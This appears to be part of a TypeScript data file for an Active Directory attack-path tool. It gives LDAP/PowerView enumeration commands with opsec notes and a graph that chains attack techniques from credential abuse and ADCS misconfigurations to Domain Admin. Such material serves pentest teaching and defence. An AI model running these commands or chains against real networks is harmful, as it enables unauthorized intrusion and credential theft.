    phase: 'enumeration',
    summary: 'Targeted LDAP / PowerView queries for SPNs, ACLs, delegation, GPOs and trusts.',
    description:
      "Beyond BloodHound's graph, query the directory directly for specific abuse primitives: kerberoastable SPNs, AS-REP-roastable users, unconstrained / constrained delegation, dangerous ACLs, GPO links, LAPS/gMSA readers, MachineAccountQuota, and trust topology. PowerView, windapsearch and ldapdomaindump answer these precisely without the noise of a full BloodHound collection.",
    tools: [
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
      { name: 'PowerView', url: 'https://github.com/PowerShellMafia/PowerSploit' },
      { name: 'ldapdomaindump', url: 'https://github.com/dirkjanm/ldapdomaindump' },
      { name: 'windapsearch', url: 'https://github.com/ropnop/windapsearch' },
    ],
    commands: [
      { label: 'bloodyAD', code: 'bloodyAD -u user -p pass -d domain.local --host dc01 get writable', lang: 'bash' },
      { label: 'Find delegation (PowerView)', code: r`Get-DomainComputer -Unconstrained; Get-DomainUser -TrustedToAuth`, lang: 'powershell' },
      { label: 'Full LDAP dump', code: r`ldapdomaindump ldap://10.0.0.1 -u 'corp.local\user' -p PASS -o loot/`, lang: 'bash' },
    ],
    mitre: mitre('T1087.002'),
    references: [
      { label: 'SpecterOps, Manual Active Directory Querying', url: 'https://posts.specterops.io/an-introduction-to-manual-active-directory-querying-with-dsquery-and-ldapsearch-84943c13d7eb' },
      { label: 'The Hacker Recipes, LDAP recon', url: 'https://www.thehacker.recipes/ad/recon/ldap' },
      { label: 'HackTricks, AD Methodology', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html' },
    ],
    requires: ['Any valid domain account'],
    opsec: 'Targeted LDAP reads blend with normal directory traffic far better than full BloodHound collection; large recursive GC queries are the main signal.',
    difficulty: 'easy',
  },
];

// NOTE: hub -> technique edges (network-recon/valid-domain-creds/find-privesc-path)
// are routed through category nodes in ad-categories.ts. The edges below are the
// cross-links and downstream chains between techniques.
export const adAdditionEdges: AttackEdge[] = [
  { source: 'username-enum-kerbrute', target: 'password-spraying' },
  { source: 'rid-cycling', target: 'password-spraying' },
  { source: 'anon-ldap-dump', target: 'password-spraying' },
  { source: 'username-enum-kerbrute', target: 'asrep-roasting' },
  { source: 'password-spraying', target: 'valid-domain-creds', label: 'valid account' },
  { source: 'mitm6-relay', target: 'ntlm-relay' },
  { source: 'coerced-auth', target: 'ntlm-relay' },
  { source: 'coerced-auth', target: 'adcs-esc8' },
  { source: 'coerced-auth', target: 'unconstrained-delegation' },
  { source: 'adcs-esc8', target: 'pass-the-certificate', label: 'DC machine cert' },
  // GenericAll (full control) → the abuse depends on the target object TYPE:
  { source: 'acl-genericall', target: 'shadow-credentials' },         // user / computer
  { source: 'acl-genericall', target: 'targeted-kerberoast' },        // user (write SPN)
  { source: 'acl-genericall', target: 'acl-forcechangepassword' },    // user (reset pw)
  { source: 'acl-genericall', target: 'rbcd', label: 'over a computer' },
  { source: 'acl-genericall', target: 'acl-addself-group', label: 'over a group' },
  { source: 'acl-genericall', target: 'dcsync', label: 'over the domain object' },
  // GenericWrite = attribute writes only (no DACL/owner) → a SUBSET of GenericAll:
  // no DCSync, no password reset. Just the specific writable-attribute abuses.
  { source: 'acl-genericwrite', target: 'shadow-credentials' },
  { source: 'acl-genericwrite', target: 'targeted-kerberoast', label: 'set SPN' },
  { source: 'acl-genericwrite', target: 'targeted-asrep', label: 'flip DONT_REQ_PREAUTH' },
  { source: 'acl-genericwrite', target: 'rbcd', label: 'over a computer' },
  { source: 'acl-genericwrite', target: 'logon-script-abuse', label: 'write scriptPath' },
  { source: 'acl-genericwrite', target: 'acl-addself-group', label: 'over a group' },
  // AddMember adds you to ANY group: Domain Admins, or another built-in priv group.
  { source: 'acl-addself-group', target: 'domain-admin', label: 'add to DA' },
  { source: 'acl-addself-group', target: 'ad-cat-priv-groups', label: 'add to a priv group' },
  { source: 'acl-forcechangepassword', target: 'valid-domain-creds', label: 'login as the user' },
  { source: 'shadow-credentials', target: 'valid-domain-creds', label: 'NT hash / TGT' },
  { source: 'targeted-kerberoast', target: 'crack-hash-offline' },
  { source: 'constrained-delegation', target: 'pass-the-ticket' },
  { source: 'rbcd', target: 'pass-the-ticket' },
  { source: 'dump-lsass', target: 'overpass-the-hash' },
  { source: 'sam-lsa-dump', target: 'overpass-the-hash' },
  { source: 'sam-lsa-dump', target: 'pass-the-hash', label: 'local NT hashes' },
  { source: 'sam-lsa-dump', target: 'mscache-crack', label: 'crack cached DCC2' },
  { source: 'pass-the-hash', target: 'overpass-the-hash' },
  { source: 'overpass-the-hash', target: 'pass-the-ticket' },
  { source: 'service-account-creds', target: 'silver-ticket' },
  // (kerberoasting -> silver-ticket removed: must crack first. The path
  //  kerberoasting -> crack-hash-offline -> service-account-creds -> silver-ticket covers it.)
  { source: 'silver-ticket', target: 'local-admin-host', label: 'scoped service / host', rel: 'host-exec' },
  { source: 'krbtgt-hash', target: 'pass-the-ticket', label: 'golden TGT' },
  { source: 'pass-the-ticket', target: 'lateral-movement-cme' },
  { source: 'lateral-movement-cme', target: 'psexec' },
  { source: 'lateral-movement-cme', target: 'smbexec' },
  { source: 'lateral-movement-cme', target: 'atexec' },
  { source: 'lateral-movement-cme', target: 'winrm-evil' },
  { source: 'lateral-movement-cme', target: 'wmiexec' },
  { source: 'lateral-movement-cme', target: 'dcom-exec' },
  { source: 'lateral-movement-cme', target: 'rdp-lateral' },
  { source: 'lateral-movement-cme', target: 'ssh-lateral' },
  { source: 'lateral-movement-cme', target: 'reverse-shell' },
  { source: 'psexec', target: 'local-admin-host', label: 'SYSTEM', rel: 'host-exec' },
  { source: 'smbexec', target: 'local-admin-host', label: 'SYSTEM', rel: 'host-exec' },
  { source: 'atexec', target: 'local-admin-host', label: 'SYSTEM', rel: 'host-exec' },
  // SMB/WMI/DCOM service-exec REQUIRE local admin → land you SYSTEM (→ local-admin-host).
  { source: 'wmiexec', target: 'local-admin-host', label: 'code exec', rel: 'host-exec' },
  { source: 'dcom-exec', target: 'local-admin-host', label: 'code exec', rel: 'host-exec' },
  // WinRM / RDP only need a remote-access GROUP (RMU / RDU), so the privilege you land
  // with depends on the account: it might already be a local admin, or just a plain user.
  // Offer BOTH outcomes: straight to admin if the account is privileged, otherwise route
  // through the user-context foothold and escalate from there.
  { source: 'winrm-evil', target: 'local-admin-host', label: 'if admin', rel: 'host-exec' },
  { source: 'winrm-evil', target: 'user-foothold', label: 'user shell', rel: 'host-exec' },
  { source: 'rdp-lateral', target: 'local-admin-host', label: 'if admin', rel: 'host-exec' },
  { source: 'rdp-lateral', target: 'user-foothold', label: 'desktop session', rel: 'host-exec' },
  // SSH lands a session as the authenticating user: root login if that account is root,
  // otherwise a user session you escalate locally (mirrors the valid-local-creds chain).
  { source: 'ssh-lateral', target: 'local-admin-host', label: 'root login', rel: 'host-exec' },
  { source: 'ssh-lateral', target: 'user-foothold', label: 'user session' },
  { source: 'linux-local-privesc', target: 'local-admin-host', label: 'root' },
  { source: 'reverse-shell', target: 'local-admin-host', label: 'if SYSTEM/admin', rel: 'host-exec' },
  { source: 'reverse-shell', target: 'user-foothold', label: 'interactive shell', rel: 'host-exec' },
  // A user-context shell → escalate locally to admin, OR just act as that user.
  { source: 'user-foothold', target: 'windows-local-privesc', label: 'escalate to admin' },
  { source: 'user-foothold', target: 'linux-local-privesc', label: 'escalate (Linux)' },
  { source: 'user-foothold', target: 'valid-domain-creds', label: 'act as the user' },
  // zerologon now lives in the 'Quick Compromise' category (off network-recon).
  { source: 'zerologon', target: 'dcsync' },
  { source: 'nopac', target: 'dcsync', label: 'as the DC, replicate' },
  { source: 'nopac', target: 'domain-admin', label: 'impersonate Administrator' },
  { source: 'laps-read', target: 'local-admin-host', label: 'local admin pw', rel: 'cred-reuse' },
  { source: 'gmsa-read', target: 'pass-the-hash', label: 'derived NT hash' },
  { source: 'gpo-abuse', target: 'domain-admin', label: 'task on DC/linked' },
  { source: 'gpo-abuse', target: 'local-admin-host', label: 'local admin on linked' },
  { source: 'gpp-cpassword', target: 'local-admin-host', label: 'local admin reuse', rel: 'cred-reuse' },
  { source: 'gpp-cpassword', target: 'valid-domain-creds', label: 'domain user / svc creds' },
  { source: 'krbtgt-hash', target: 'trust-sid-history', label: 'child krbtgt' },
  { source: 'trust-sid-history', target: 'enterprise-admin', label: 'Enterprise Admin' },
  { source: 'printnightmare', target: 'local-admin-host', label: 'SYSTEM' },
  // domain-admin -> skeleton-key now routes through the 'Persistence' category.
  { source: 'krbtgt-hash', target: 'diamond-ticket' },
  { source: 'diamond-ticket', target: 'pass-the-ticket' },
  { source: 'adcs-esc1', target: 'pass-the-certificate', label: 'PKINIT cert' },
  { source: 'shadow-credentials', target: 'pass-the-certificate', label: 'key credential' },
  { source: 'pass-the-certificate', target: 'valid-domain-creds', label: 'TGT + NT hash' },
  // The cert authenticates as whoever it impersonates, so the cert→auth hub itself
  // reaches DCSync (a DC / replication-capable cert) or DA (a cert as a Domain Admin).
  { source: 'pass-the-certificate', target: 'dcsync', label: 'DC / replication cert' },
  { source: 'pass-the-certificate', target: 'domain-admin', label: 'cert impersonates a DA' },
  { source: 'mssql-linked-servers', target: 'user-foothold', label: 'xp_cmdshell as the SQL service account' },
  { source: 'adcs-esc4', target: 'adcs-esc1', label: 'rewrite template' },
  // ADCS ESC family -> downstream
  { source: 'adcs-esc2', target: 'pass-the-certificate', label: 'on-behalf-of cert' },
  { source: 'adcs-esc3', target: 'pass-the-certificate', label: 'on-behalf-of cert' },
  { source: 'adcs-esc5', target: 'golden-certificate', label: 'CA-host takeover' },
  { source: 'adcs-esc6', target: 'pass-the-certificate', label: 'SAN-spoofed cert' },
  { source: 'adcs-esc7', target: 'adcs-esc6', label: 'flip EDITF flag' },
  { source: 'adcs-esc7', target: 'pass-the-certificate', label: 'SubCA issue' },
  { source: 'adcs-esc9', target: 'pass-the-certificate', label: 'UPN-swap cert' },
  { source: 'adcs-esc10', target: 'pass-the-certificate', label: 'weak mapping' },
  { source: 'coerced-auth', target: 'adcs-esc11' },
  { source: 'adcs-esc11', target: 'pass-the-certificate', label: 'DC machine cert' },
  { source: 'adcs-esc13', target: 'pass-the-certificate', label: 'linked-policy cert' },
  { source: 'adcs-esc15', target: 'pass-the-certificate', label: 'injected EKU cert' },
  { source: 'golden-certificate', target: 'domain-admin', label: 'forge DA cert' },
];
